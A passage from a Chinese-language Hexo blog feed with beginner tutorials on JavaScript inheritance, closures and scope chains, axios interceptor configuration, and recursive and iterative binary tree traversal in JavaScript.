class="hljs-keyword">new</span> SubType();<span class="hljs-built_in">console</span>.log(instance2.colors);  <span class="hljs-comment">//&quot;red,blue,green&quot;</span></code></pre></div><p>（3）第三种方式是组合继承，组合继承是将原型链和借用构造函数组合起来使用的一种方式。通过借用构造函数的方式来实现类型的属性的继承，通过将子类型的原型设置为超类型的实例来实现方法的继承。这种方式解决了上面的两种模式单独使用时的问题，但是由于我们是以超类型的实例来作为子类型的原型，所以调用了两次超类的构造函数，造成了子类型的原型中多了很多不必要的属性。</p><p>（4）第四种方式是原型式继承，原型式继承的主要思路就是基于已有的对象来创建新的对象，实现的原理是，向函数中传入一个对象，然后返回一个以这个对象为原型的对象。这种继承的思路主要不是为了实现创造一种新的类型，只是对某个对象实现一种简单继承，ES5 中定义的 Object.create() 方法就是原型式继承的实现。缺点与原型链方式相同。</p><p>（5）第五种方式是寄生式继承，寄生式继承的思路是创建一个用于封装继承过程的函数，通过传入一个对象，然后复制一个对象的副本，然后对象进行扩展，最后返回这个对象。这个扩展的过程就可以理解是一种继承。这种继承的优点就是对一个简单对象实现继承，如果这个对象不是我们的自定义类型时。缺点是没有办法实现函数的复用。</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">createAnother</span>(<span class="hljs-params">original</span>)</span>&#123;        <span class="hljs-keyword">var</span> <span class="hljs-keyword">clone</span> = <span class="hljs-keyword">object</span>(original); <span class="hljs-comment">//通过调用函数创建一个新对象</span>        <span class="hljs-keyword">clone</span>.sayHi = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;  <span class="hljs-comment">// 某种方式增强这个对象</span>        console.log(<span class="hljs-string">&quot;hi&quot;</span>);    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">clone</span>;  <span class="hljs-comment">// 返回这个对象</span>&#125;<span class="hljs-keyword">var</span> person = &#123;    name: <span class="hljs-string">&quot;james&quot;</span>&#125;<span class="hljs-keyword">var</span> anotherPerson = createAnother(person);anotherPerson.sayHi(); <span class="hljs-comment">// &quot;hi&quot;</span></code></pre></div><p>（6）第六种方式是寄生式组合继承，组合继承的缺点就是使用超类型的实例做为子类型的原型，导致添加了不必要的原型属性。寄生式组合继承的方式是使用超类型的原型的副本来作为子类型的原型，这样就避免了创建不必要的属性。</p>]]></content>
    
    
    <categories>
      
      <category>js</category>
      
    </categories>
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>闭包</title>
    <link href="/hexo_blog/2021/08/06/%E9%97%AD%E5%8C%85/"/>
    <url>/hexo_blog/2021/08/06/%E9%97%AD%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<h1 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>对于初学者来说，闭包似乎有一点神秘，当了解过js的执行期上下文之后，或许就会豁然开朗，在理解闭包之前，有个重要的概念需要先了解一下，就是 js 执行上下文。</p><h2 id="变量作用域"><a href="#变量作用域" class="headerlink" title="变量作用域"></a>变量作用域</h2><blockquote><p>在javascript中，Javascript有着特殊的变量作用域，–全局变量和局部变量</p><ul><li><p>就在于函数内部可以直接读取全局变量</p><div class="hljs code-wrapper"><pre><code class="hljs delphi">  　<span class="hljs-keyword">var</span> n=<span class="hljs-number">999</span>;            　　<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f1</span><span class="hljs-params">()</span><span class="hljs-comment">&#123;</span></span><span class="hljs-function"><span class="hljs-comment">  　　　　alert(n);</span></span><span class="hljs-function"><span class="hljs-comment">  　　&#125;</span></span><span class="hljs-function">          </span><span class="hljs-function">  　　<span class="hljs-title">f1</span><span class="hljs-params">()</span>;</span> <span class="hljs-comment">// 999</span></code></pre></div></li></ul><ul><li><p>在函数外部自然无法读取函数内的局部变量</p><div class="hljs code-wrapper"><pre><code class="hljs actionscript">  　　<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f1</span><span class="hljs-params">()</span></span>&#123;  　　　　<span class="hljs-keyword">var</span> n=<span class="hljs-number">999</span>; <span class="hljs-comment">// 使用var--如果不用的话，你实际上声明了一个全局变量！</span>  　　&#125;            　　alert(n); <span class="hljs-comment">// error</span></code></pre></div></li></ul></blockquote><h2 id="作用域链"><a href="#作用域链" class="headerlink" title="作用域链"></a>作用域链</h2><blockquote><ul><li><p>[[scope]] : 每个JavaScript函数都是一个对象。对象中有些属性我们可以访问，但有些不可以，这些属性仅提供JavaScript引擎存取，[[scope]]就是其中一个。[[scope]]指的就是我们所说的作用域，其中存储了运行期上下文的集合</p></li><li><p>作用域链 ： [[scope]]中存储的执行期上下文对象的集合，这个集合呈链式链接，我们把这种链式链接叫做作用域链</p></li><li><p>运行期上下文 ： 当函数执行的前一刻，会创建一个称为执行期上下文的内部对象。一个执行期上下文定义了一个函数执行时的环境，函数每次执行时对应的执行上下文都是独一无二的，所以多次调用一个函数会导致创建多个执行期上下文，当函数执行完毕，它所产生的执行上下文被销毁</p><div class="hljs code-wrapper"><pre><code class="hljs actionscript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span>&#123;&#125;</code></pre></div><p>第一次执行 test()   -&gt; AO{} // AO用完就不用了</p><p>第二次执行 test()   -&gt; AO{} // 另外的AO</p><p>……</p></li><li><p>查找变量 ：在哪个函数里面查找变量，就从哪个函数的作用域链的顶端依次向下查找函数类对象，</p></li></ul><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">a</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">b</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">var</span> bb = <span class="hljs-number">234</span>;        aa = <span class="hljs-number">0</span>    &#125;    <span class="hljs-keyword">var</span> aa = <span class="hljs-number">123</span>;    b();    <span class="hljs-built_in">console</span>.log(aa)&#125;<span class="hljs-keyword">var</span> glob = <span class="hljs-number">100</span>;a();</code></pre></div><p>0是最顶端，1次之，查找顺序是从顶端往下</p><p><img src="C:/Users/l%27x/AppData/Roaming/Typora/typora-user-images/image-20210924094318982.png" alt="image-20210924094318982"><img src="C:/Users/l%27x/AppData/Roaming/Typora/typora-user-images/image-20210924094335484.png" alt="image-20210924094335484"></p><p>理解过程：bb的AO是拿到aa的AO，就是同一个AO，bb只是引用了aa的AO，GO也是同一个，<code>function b()&#123;&#125;</code>执行完，干掉的是b自己的AO(销毁执行期上下文)(去掉连接线)，下一次<code>function b</code>执行时，产生全新的b的AO，b执行完只销毁自己的AO，不会销毁a的AO，<code>function a()&#123;&#125;</code>执行完，会把a自己的AO销毁【会把<code>function b</code>也销毁】，只剩GO(回归到a被定义的时候)，等下一次function a再被执行时，会产生一个全新的AO。。。周而复始</p></blockquote><p><img src="C:/Users/l%27x/AppData/Roaming/Typora/typora-user-images/image-20210924152003108.png" alt="image-20210924152003108"></p><h2 id="执行期上下文"><a href="#执行期上下文" class="headerlink" title="执行期上下文"></a>执行期上下文</h2><blockquote><p>每当 Javascript 代码在运行的时候，它都是在执行上下文中运行。</p><p>js执行三部曲：1 语法分析 2 预编译 3 解释执行  </p><p>JavaScript 中有三种执行上下文类型</p><ul><li><p><strong>全局执行上下文</strong> — 这是默认或者说基础的上下文，任何不在函数内部的代码都在全局上下文中。它会执行两件事：创建一个全局的 window 对象（浏览器的情况下），并且设置 <code>this</code> 的值等于这个全局对象。一个程序中只会有一个全局执行上下文。</p></li><li><p><strong>函数执行上下文</strong> — 每当一个函数被调用时, 都会为该函数创建一个新的上下文。每个函数都有它自己的执行上下文，<code>不过是在函数被调用时创建的</code>。函数上下文可以有任意多个。每当一个新的执行上下文被创建。</p></li><li><p><strong>Eval 函数执行上下文</strong> — 执行在 <code>eval</code> 函数内部的代码也会有它属于自己的执行上下文，但由于 JavaScript 开发者并不经常使用 <code>eval</code>。</p><p>在javascript中，使用后进先出数据结构的执行栈来存储代码运行时创建的所有执行上下文，也就是在其它编程语言中所说的“调用栈”，当 JavaScript 引擎第一次遇到你的脚本时，它会创建一个全局的执行上下文并且压入当前执行栈。每当引擎遇到一个函数调用，它会为该函数创建一个新的执行上下文并压入栈的顶部。引擎会执行那些执行上下文位于栈顶的函数。当该函数执行结束时，执行上下文从栈中弹出，控制流程到达当前栈中的下一个上下文。</p></li></ul></blockquote><h2 id="闭包的产生"><a href="#闭包的产生" class="headerlink" title="闭包的产生"></a>闭包的产生</h2><blockquote><p>当内部函数被保存到外部时，将会生成闭包，闭包导致原有作用域链不释放，造成内存泄漏</p><p><code>--内存泄漏就是内存占用，内存被占用的越多，内存就变得越少，就像内存被泄漏了一样</code></p><p>出于种种原因，我们有时候需要得到函数内的局部变量，正常情况下，这是办不到的，只有通过变通方法才能实现。</p><div class="hljs code-wrapper"><pre><code class="hljs js">　<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f1</span>(<span class="hljs-params"></span>)</span>&#123;　　　　<span class="hljs-keyword">var</span> n=<span class="hljs-number">999</span>;　　　　<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">f2</span>(<span class="hljs-params"></span>)</span>&#123;　　　　　　alert(n);　　　　&#125;　　　　<span class="hljs-keyword">return</span> f2;　　&#125;　　<span class="hljs-keyword">var</span> result=f1();　　result(); <span class="hljs-comment">// 999</span></code></pre></div><p>在上面的代码中，函数f2就被包括在函数f1内部，这时f1内部的所有局部变量，对f2都是可见的。但是反过来就不行，f2内部的局部变量，对f1就是不可见的。这就是Javascript语言特有的”链式作用域”结构（chain scope），子对象会一级一级地向上寻找所有父对象的变量。所以，父对象的所有变量，对子对象都是可见的，反之则不成立。</p><p>上一节代码中的f2函数，就是闭包。直观来讲，闭包就是能够读取其他函数内部变量的函数。</p><p>由于在Javascript语言中，只有函数内部的子函数才能读取局部变量，因此可以把闭包简单理解成”定义在一个函数内部的函数”。</p><p><code>但凡是内部的函数被保存到外部，一定生成闭包</code></p></blockquote><h2 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h2><blockquote><ul><li>实现公有变量</li><li>可以做缓存</li><li>可以实现封装，属性私有化</li><li>模块化开发，防止污染全局变量</li></ul></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul><li><p>闭包就是能够读取其他函数内部变量的函数</p></li><li><p>闭包是指有权访问另一个函数作用域中变量的函数，创建闭包的最常见的方式就是在一个函数内创建另一个函数，通过另一个函数访问这个函数的局部变量,利用闭包可以突破作用链域</p></li><li><p>闭包的特性：</p><ul><li>函数内再嵌套函数</li><li>内部函数可以引用外层的参数和变量</li><li>参数和变量不会被垃圾回收机制回收</li></ul></li><li><p>由于闭包会使得函数中的变量都被保存在内存中，内存消耗很大，所以不能滥用闭包，否则会造成网页的性能问题，在IE中可能导致内存泄露</p></li><li><p>解决方法是，在退出函数之前，将不使用的局部变量全部删除</p></li></ul>]]></content>
    
    
    <categories>
      
      <category>js</category>
      
    </categories>
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二维数组的查找 🤺</title>
    <link href="/hexo_blog/2021/08/02/axios%E6%8B%A6%E6%88%AA%E5%99%A8/"/>
    <url>/hexo_blog/2021/08/02/axios%E6%8B%A6%E6%88%AA%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="axios拦截器接口配置与使用"><a href="#axios拦截器接口配置与使用" class="headerlink" title="axios拦截器接口配置与使用"></a>axios拦截器接口配置与使用</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>实习期间遇到了一个axios拦截器接口配置的问题，这里总结一下相关使用</p><p>附上官方文档(<a href="http://axios-js.com/zh-cn/docs/index.html">http://axios-js.com/zh-cn/docs/index.html</a>)</p><p> ▉ 什么是axios拦截器、为什么要使用axios拦截器？</p><blockquote><ul><li><p> Axios 是一个基于 promise 的 HTTP 库，可以用在浏览器和 node.js 中。</p></li><li><p>页面发送http请求，很多情况我们要对请求和其响应进行特定的处理；如果请求数非常多，单独对每一个请求进行处理会变得非常麻烦，程序的优雅性也会大打折扣。好在强大的axios为开发者提供了这样一个API：拦截器。拦截器分为 请求（request）拦截器和 响应（response）拦截器。</p></li><li><p>它有很多优秀的特性，例如拦截请求和响应、取消请求、转换json、客户端防御XSRF等</p></li></ul></blockquote><img src="C:/Users/l%27x/AppData/Roaming/Typora/typora-user-images/image-20210917154842286.png" alt="image-20210917154842286" style="zoom:50%;" /><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-comment">//   在http.js中引入axios</span><span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;axios&#x27;</span>   <span class="hljs-comment">//引入 axios</span><span class="hljs-keyword">import</span> QS <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;qs&#x27;</span>; <span class="hljs-comment">// 引入qs模块，用来序列化post类型的数据，某些请求会用得到</span><span class="hljs-keyword">import</span> &#123; Message &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;element-ui&#x27;</span>    <span class="hljs-comment">//引入 element-ui 的 Message 模块，用于信息提示</span><span class="hljs-keyword">import</span> store <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@/store&#x27;</span>     <span class="hljs-comment">//引入 vuex 中的数据</span><span class="hljs-keyword">import</span> &#123; getToken &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;@/utils/auth&#x27;</span>   <span class="hljs-comment">//引入拿到的权限tocken</span><span class="hljs-comment">// create an axios instance   创建axios实例</span><span class="hljs-keyword">const</span> service = axios.create(&#123;配置信息...&#125;)</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs awk">`配置引入`import Qs from <span class="hljs-string">&#x27;qs&#x27;</span>;export default&#123;  <span class="hljs-regexp">//</span> 请求的接口，在请求的时候，如axios.get(url,config);这里的url会覆盖掉config中的url  url: <span class="hljs-string">&#x27;&#x27;</span>,  <span class="hljs-regexp">//</span> 请求的接口  baseURL:   <span class="hljs-regexp">//</span> 默认请求方法  title: <span class="hljs-string">&#x27;&#x27;</span>,  method: <span class="hljs-string">&#x27;post&#x27;</span>,  <span class="hljs-regexp">//</span> 在发送请求之前对请求数据做处理  transformRequest: [    <span class="hljs-keyword">function</span>(data) &#123;      <span class="hljs-regexp">//</span> 为了避免qs格式化时对内层对象的格式化先把内层的对象转为      <span class="hljs-regexp">//</span> data.strSQL = base64encode(data.strSQL)      <span class="hljs-regexp">//</span> 由于使用的form-data传数据所以要格式化      data = Qs.stringify(data);      return data;    &#125;,  ],  <span class="hljs-regexp">//</span> 提前处理返回的数据=  transformResponse: [    <span class="hljs-keyword">function</span>(data) &#123;      return data;    &#125;,  ],  <span class="hljs-regexp">//</span> 请求头信息  headers: &#123;      &#125;,  <span class="hljs-regexp">//</span> 默认parameter参数  params: &#123;  &#125;,  <span class="hljs-regexp">//</span> 序列化param  paramsSerializer: <span class="hljs-keyword">function</span>(params) &#123;    return Qs.stringify(params);  &#125;,  <span class="hljs-regexp">//</span> 默认post参数，使用axios.post(url,&#123;&#125;,config);如果没有额外的也必须要用一个空对象，否则会报错  data: &#123;  &#125;,  <span class="hljs-regexp">//</span> 设置超时时间  timeout: <span class="hljs-number">500000000</span>,  <span class="hljs-regexp">//</span> 是否跨站点访问控制请求  <span class="hljs-regexp">//</span> withCredentials: false, <span class="hljs-regexp">//</span> default  withCredentials: true, <span class="hljs-regexp">//</span> 自动携带cookie  <span class="hljs-regexp">//</span> 返回数据类型  responseType: <span class="hljs-string">&#x27;json&#x27;</span>, <span class="hljs-regexp">//</span> default  <span class="hljs-regexp">//</span> 将upload事件注释掉，防止跨域状态下发起option请求  <span class="hljs-regexp">//</span> onUploadProgress: <span class="hljs-keyword">function</span>(progressEvent) &#123;  <span class="hljs-regexp">//</span>   <span class="hljs-regexp">//</span> Do whatever you want with the native progress event  <span class="hljs-regexp">//</span> &#125;,  <span class="hljs-regexp">//</span> onDownloadProgress: <span class="hljs-keyword">function</span>(progressEvent) &#123;  <span class="hljs-regexp">//</span>   <span class="hljs-regexp">//</span> Do whatever you want with the native progress event  <span class="hljs-regexp">//</span> &#125;,  maxContentLength: <span class="hljs-number">2000</span>,  validateStatus: <span class="hljs-keyword">function</span>(status) &#123;    return status &gt;= <span class="hljs-number">200</span> &amp;&amp; status &lt; <span class="hljs-number">300</span>; <span class="hljs-regexp">//</span> default  &#125;,  <span class="hljs-regexp">//</span> `maxRedirects` 定义在 node.js 中 follow 的最大重定向数目  <span class="hljs-regexp">//</span> 如果设置为<span class="hljs-number">0</span>，将不会 follow 任何重定向  maxRedirects: <span class="hljs-number">5</span>,&#125;;</code></pre></div><p> ▉ 请求拦截器</p><blockquote><div class="hljs code-wrapper"><pre><code class="hljs ada">axios.interceptors.request.<span class="hljs-keyword">use</span>(<span class="hljs-keyword">function</span> <span class="hljs-title"></span>(config) &#123;    // 在发起请求请做一些业务处理    <span class="hljs-keyword">return</span> <span class="hljs-type">config</span>;  &#125;, <span class="hljs-keyword">function</span> <span class="hljs-title"></span>(error) &#123;    // 对请求失败做处理    <span class="hljs-keyword">return</span> <span class="hljs-type">Promise.reject(error)</span>;  &#125;);</code></pre></div></blockquote><p> ▉ 响应拦截器</p><blockquote><div class="hljs code-wrapper"><pre><code class="hljs ada">axios.interceptors.response.<span class="hljs-keyword">use</span>(<span class="hljs-keyword">function</span> <span class="hljs-title"></span>(response) &#123;    // 对响应数据做处理    <span class="hljs-keyword">return</span> <span class="hljs-type">response</span>;  &#125;, <span class="hljs-keyword">function</span> <span class="hljs-title"></span>(error) &#123;    // 对响应错误做处理    <span class="hljs-keyword">return</span> <span class="hljs-type">Promise.reject(error)</span>;  &#125;);</code></pre></div></blockquote>]]></content>
    
    
    <categories>
      
      <category>vue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二叉树</title>
    <link href="/hexo_blog/2021/07/18/%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    <url>/hexo_blog/2021/07/18/%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<h1 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>树是用来模拟具有树状结构性质的数据集合,顾名思义，二叉树是每个节点最多有两个子树的树结构，通常子树被称作“左子树”和“右子树”</p><h3 id="常见知识点"><a href="#常见知识点" class="headerlink" title="常见知识点"></a>常见知识点</h3><blockquote><p>1.第n层的节点数最多为2n个节点</p><p>2.n层二叉树最多有20+…+2n=2n+1-1个节点</p><p>3.第一个非叶子节点：length/2</p><p>4.一个节点的孩子节点：2n、2n+1</p></blockquote><h3 id="基础遍历"><a href="#基础遍历" class="headerlink" title="基础遍历"></a>基础遍历</h3><h5 id="▉前序遍历"><a href="#▉前序遍历" class="headerlink" title="▉前序遍历"></a>▉前序遍历</h5><blockquote><p>​    若二叉树为空,则空操作返回,否则</p><ol><li><strong>先</strong>访问<strong>根</strong>结点</li><li>前序遍历<strong>左</strong>子树,</li><li>前序遍历<strong>右</strong>子树.</li></ol></blockquote><p>​    <img src="C:/Users/l%27x/AppData/Roaming/Typora/typora-user-images/image-20210923092241832.png" alt="image-20210923092241832" style="zoom:50%;" /></p><ul><li><p>递归遍历</p><blockquote><p>先序递归遍历的思路是先遍历根结点，将值存入数组，然后递归遍历：先左结点，将值存入数组，继续向下遍历，然后再回溯遍历右结点，将值存入数组，这样递归循环。</p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs awk">var preListRec = []; <span class="hljs-regexp">//</span>定义保存先序遍历结果的数组var preOrderRec = <span class="hljs-keyword">function</span>(node) &#123;    <span class="hljs-keyword">if</span> (node) &#123; <span class="hljs-regexp">//</span>判断二叉树是否为空        preListRec.push(node.value); <span class="hljs-regexp">//</span>将结点的值存入数组中        preOrderRec(node.left); <span class="hljs-regexp">//</span>递归遍历左子树        preOrderRec(node.right); <span class="hljs-regexp">//</span>递归遍历右子树    &#125;&#125;preOrderRec(tree);console.log(preListRec);<span class="hljs-regexp">//</span>[ <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span> ]</code></pre></div></li><li><p>非递归遍历</p><blockquote><p>先序非递归遍历是利用了栈，将根结点放入栈中，然后再取出来，将值放入结果数组，然后如果存在右子树，将右子树压入栈，如果存在左子树，将左子树压入栈，然后循环判断栈是否为空，重复上述步骤。</p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs awk">var preListUnRec = []; <span class="hljs-regexp">//</span>定义保存先序遍历结果的数组var preOrderUnRecursion = <span class="hljs-keyword">function</span>(node) &#123;    <span class="hljs-keyword">if</span> (node) &#123; <span class="hljs-regexp">//</span>判断二叉树是否为空        var stack = [node]; <span class="hljs-regexp">//</span>将二叉树压入栈        <span class="hljs-keyword">while</span> (stack.length !== <span class="hljs-number">0</span>) &#123; <span class="hljs-regexp">//</span>如果栈不为空，则循环遍历            node = stack.pop(); <span class="hljs-regexp">//</span>从栈中取出一个结点            preListUnRec.push(node.value); <span class="hljs-regexp">//</span>将取出结点的值存入数组中            <span class="hljs-keyword">if</span> (node.right) stack.push(node.right); <span class="hljs-regexp">//</span>如果存在右子树，将右子树压入栈            <span class="hljs-keyword">if</span> (node.left) stack.push(node.left); <span class="hljs-regexp">//</span>如果存在左子树，将左子树压入栈        &#125;    &#125;&#125;preOrderUnRecursion(tree);console.log(preListUnRec);</code></pre></div></li></ul><h5 id="▉中序遍历"><a href="#▉中序遍历" class="headerlink" title="▉中序遍历"></a>▉中序遍历</h5><blockquote><p>​    若树为空,则空操作返回,否则</p><ol><li>从根结点开始(注意不是先访问根结点)</li><li>中序遍历根结点的左子树,然后是访问根结点</li><li>中序遍历右子树</li></ol></blockquote><p>​    <img src="C:/Users/l%27x/AppData/Roaming/Typora/typora-user-images/image-20210923092324252.png" alt="image-20210923092324252" style="zoom:50%;" /></p><p>递归遍历</p><blockquote><p>中序递归遍历的思路是先递归遍历左子树，从最后一个左子树开始存入数组，然后回溯遍历双亲结点，再是右子树，这样递归循环</p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs awk">var inListRec = []; <span class="hljs-regexp">//</span>定义保存中序遍历结果的数组var inOrderRec = <span class="hljs-keyword">function</span>(node) &#123;    <span class="hljs-keyword">if</span> (node) &#123; <span class="hljs-regexp">//</span>判断二叉树是否为空        inOrderRec(node.left); <span class="hljs-regexp">//</span>递归遍历左子树        inListRec.push(node.value); <span class="hljs-regexp">//</span>将结点的值存入数组中        inOrderRec(node.right); <span class="hljs-regexp">//</span>递归遍历右子树    &#125;&#125;inOrderRec(tree);console.log(inListRec);<span class="hljs-regexp">//</span>[ <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span> ]</code></pre></div><p>非递归遍历</p><blockquote><p>非递归遍历的思路是将当前结点压入栈，然后将左子树当做当前结点，如果当前结点为空，将双亲结点取出来，将值保存进数组，然后将右子树当做当前结点，进行循环。</p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs awk">var inListUnRec = []; <span class="hljs-regexp">//</span>定义保存中序遍历结果的数组var inOrderUnRec = <span class="hljs-keyword">function</span>(node) &#123;    <span class="hljs-keyword">if</span> (node) &#123; <span class="hljs-regexp">//</span>判断二叉树是否为空        var stack = []; <span class="hljs-regexp">//</span>建立一个栈        <span class="hljs-keyword">while</span> (stack.length !== <span class="hljs-number">0</span> || node) &#123; <span class="hljs-regexp">//</span>如果栈不为空或结点不为空，则循环遍历            <span class="hljs-keyword">if</span> (node) &#123; <span class="hljs-regexp">//</span>如果结点不为空                stack.push(node); <span class="hljs-regexp">//</span>将结点压入栈                node = node.left; <span class="hljs-regexp">//</span>将左子树作为当前结点            &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-regexp">//</span>左子树为空，即没有左子树的情况                node = stack.pop(); <span class="hljs-regexp">//</span>将结点取出来                inListUnRec.push(node.value); <span class="hljs-regexp">//</span>将取出结点的值存入数组中                node = node.right; <span class="hljs-regexp">//</span>将右结点作为当前结点            &#125;        &#125;    &#125;&#125;inOrderUnRec(tree);console.log(inListUnRec);<span class="hljs-regexp">//</span>[ <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span> ]</code></pre></div><h5 id="▉后序遍历"><a href="#▉后序遍历" class="headerlink" title="▉后序遍历"></a>▉后序遍历</h5><blockquote><p>​    若树为空,则空操作返回，否则</p><ol><li>从左到右先叶子后结点的方式遍历访问左右子树</li><li>最后是访问根结点.</li></ol></blockquote><img src="C:/Users/l%27x/AppData/Roaming/Typora/typora-user-images/image-20210923092350092.png" alt="image-20210923092350092" style="zoom:50%;" /><p>递归</p><blockquote><p>递归遍历也是和上面的差不多，先走左子树，当左子树没有孩子结点时，将此结点的值放入数组中，然后回溯遍历双亲结点的右结点，递归遍历。</p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs awk">var postListRec = []; <span class="hljs-regexp">//</span>定义保存后序遍历结果的数组var postOrderRec = <span class="hljs-keyword">function</span>(node) &#123;    <span class="hljs-keyword">if</span> (node) &#123; <span class="hljs-regexp">//</span>判断二叉树是否为空        postOrderRec(node.left); <span class="hljs-regexp">//</span>递归遍历左子树        postOrderRec(node.right); <span class="hljs-regexp">//</span>递归遍历右子树        postListRec.push(node.value); <span class="hljs-regexp">//</span>将结点的值存入数组中    &#125;&#125;postOrderRec(tree);console.log(postListRec);<span class="hljs-regexp">//</span>[ <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span> ]</code></pre></div><p>非递归</p><blockquote><p>这里使用了一个tmp变量来记录上一次出栈、入栈的结点。思路是先把根结点和左树推入栈，然后取出左树，再推入右树，取出，最后取根结点</p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs awk">var postListUnRec = []; <span class="hljs-regexp">//</span>定义保存后序遍历结果的数组var postOrderUnRec = <span class="hljs-keyword">function</span>(node) &#123;    <span class="hljs-keyword">if</span> (node) &#123; <span class="hljs-regexp">//</span>判断二叉树是否为空        var stack = [node]; <span class="hljs-regexp">//</span>将二叉树压入栈        var tmp = null; <span class="hljs-regexp">//</span>定义缓存变量        <span class="hljs-keyword">while</span> (stack.length !== <span class="hljs-number">0</span>) &#123; <span class="hljs-regexp">//</span>如果栈不为空，则循环遍历            tmp = stack[stack.length - <span class="hljs-number">1</span>]; <span class="hljs-regexp">//</span>将栈顶的值保存在tmp中            <span class="hljs-keyword">if</span> (tmp.left &amp;&amp; node !== tmp.left &amp;&amp; node !== tmp.right) &#123; <span class="hljs-regexp">//</span>如果存在左子树                stack.push(tmp.left); <span class="hljs-regexp">//</span>将左子树结点压入栈            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (tmp.right &amp;&amp; node !== tmp.right) &#123; <span class="hljs-regexp">//</span>如果结点存在右子树                stack.push(tmp.right); <span class="hljs-regexp">//</span>将右子树压入栈中            &#125; <span class="hljs-keyword">else</span> &#123;                postListUnRec.push(stack.pop().value);                node = tmp;            &#125;        &#125;    &#125;&#125;postOrderUnRec(tree);console.log(postListUnRec);<span class="hljs-regexp">//</span>[ <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;c&#x27;</span>, <span class="hljs-string">&#x27;*&#x27;</span>, <span class="hljs-string">&#x27;+&#x27;</span>, <span class="hljs-string">&#x27;d&#x27;</span>, <span class="hljs-string">&#x27;e&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-string">&#x27;-&#x27;</span> ]</code></pre></div><p>▉广度遍历</p><blockquote><p>广度遍历是从二叉树的根结点开始，自上而下逐层遍历；在同一层中，按照从左到右的顺序对结点逐一访问。<br>实现原理：使用数组模拟队列，首先将根结点归入队列。当队列不为空时，执行循环：取出队列的一个结点，如果该节点有左子树，则将该节点的左子树存入队列；如果该节点有右子树，则将该节点的右子树存入队列。</p></blockquote><div 